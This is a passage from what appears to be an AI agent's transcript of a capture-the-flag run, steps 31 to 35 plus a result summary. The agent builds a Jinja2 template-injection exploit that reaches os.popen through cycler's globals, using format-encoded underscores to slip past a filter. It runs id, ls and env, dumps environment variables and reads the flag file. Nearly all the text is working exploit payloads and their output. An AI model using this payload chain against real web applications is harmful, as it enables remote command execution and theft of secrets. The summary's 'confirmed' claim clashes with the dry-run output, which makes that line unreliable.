  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\nG='(cycler|attr((\"%c%cinit%c%c\"|format(95,95,95,95)))|attr((\"%c%cglobals%c%c\"|format(95,95,95,95))))'\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\ncmd=sys.argv[1]\nrun(\"%s[('%%c%%cget%%c%%c'|format(95,95,95,95))](%r)|list\" % (G,cmd))\nEOF\npython3 exp.py 'ls -la /app /tmp/notifly; id; ls /'",
  "timeout_seconds": 60
}
~~~

~~~
{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))[('%c%cget%c%c'|format(95,95,95,95))]('ls -la /app /tmp/notifly; id; ls /')|list }}
render error: 'dict object' has no attribute '__get__'
~~~

### Step 32: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\nG='(cycler|attr((\"%c%cinit%c%c\"|format(95,95,95,95)))|attr((\"%c%cglobals%c%c\"|format(95,95,95,95))))'\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\nrun(\"%s['os']\"%G)\nrun(\"%s['os']['popen']\"%G)\nrun(\"%s['os']['popen']('id')\"%G)\nrun(\"%s['os']['popen']('id')['read']()\"%G)\nEOF\npython3 exp.py 2>&1 | grep -v '^{.doc'",
  "timeout_seconds": 60
}
~~~

~~~
{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['os'] }}
<module 'os' (frozen)>

{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['os']['popen'] }}
<function popen at 0x7b45b8dc3100>

{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['os']['popen']('id') }}
<os._wrap_close object at 0x7b45b77a7170>

{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['os']['popen']('id')['read']() }}
uid=999(app) gid=999(app) groups=999(app)
~~~

### Step 33: `bash`
~~~
{
  "command": "cd /challenge/workspace; cat > exp.py <<'EOF'\nimport tpl_test,sys\nG='(cycler|attr((\"%c%cinit%c%c\"|format(95,95,95,95)))|attr((\"%c%cglobals%c%c\"|format(95,95,95,95))))'\ndef run(expr):\n    p='{{ %s }}'%expr\n    print(p); print(tpl_test.t(p)); print()\ncmd=sys.argv[1]\nrun(\"%s['os']['popen'](%r)['read']()\" % (G,cmd))\nEOF\npython3 exp.py 'ls -la /app /tmp/notifly; echo ---; ls /; echo ---; env'",
  "timeout_seconds": 60
}
~~~

~~~
{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['os']['popen']('ls -la /app /tmp/notifly; echo ---; ls /; echo ---; env')['read']() }}
/tmp/notifly:
total 4
drwxr-xr-x 2 app  app  60 Oct 28 11:27 .
drwxrwxrwt 3 root root 60 Oct 29 10:21 ..
-rw-r--r-- 1 app  app  29 Oct 29 10:21 flag.key
---
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
---
HOSTNAME=ba1439318914
HOME=/home/app
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_SHA256=c2c4321961fab0fb999d66e0cecf521c2ab3994c7992873ea99e306c1094fd5a
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
PYTHON_VERSION=3.12.15
PWD=/opt/app
FLAG=FLAG{jinja2-sst1-rc3-g4dg3t}
~~~

### Step 34: `bash`
~~~
{
  "command": "cd /challenge/workspace; python3 exp.py 'cat /tmp/notifly/flag.key; ls -la /opt/app'",
  "timeout_seconds": 60
}
~~~

~~~
{{ (cycler|attr(("%c%cinit%c%c"|format(95,95,95,95)))|attr(("%c%cglobals%c%c"|format(95,95,95,95))))['os']['popen']('cat /tmp/notifly/flag.key; ls -la /opt/app')['read']() }}
FLAG{jinja2-sst1-rc3-g4dg3t}
total 24
drwxr-xr-x 1 root root 4096 Oct 27 16:06 .
drwxr-xr-x 1 root root 4096 Oct 27 16:02 ..
-rw-r--r-- 1 root root 3007 Oct 16 22:44 app.py
-rw-r--r-- 1 root root 6424 Oct 16 13:52 index.html
-rw-r--r-- 1 root root   44 Oct 16 13:52 requirements.txt
~~~

### Step 35: `submit_flag`
~~~
{
  "flag": "FLAG{jinja2-sst1-rc3-g4dg3t}"
}
~~~

~~~
DRY RUN — would submit "FLAG{jinja2-sst1-rc3-g4dg3t}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{jinja2-sst1-rc3-g4dg3t}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.02 (winner), $0.02 (whole swarm)
- **Wall time**: 3m04s
- **Generated**: 2026-10-30T00:14:55
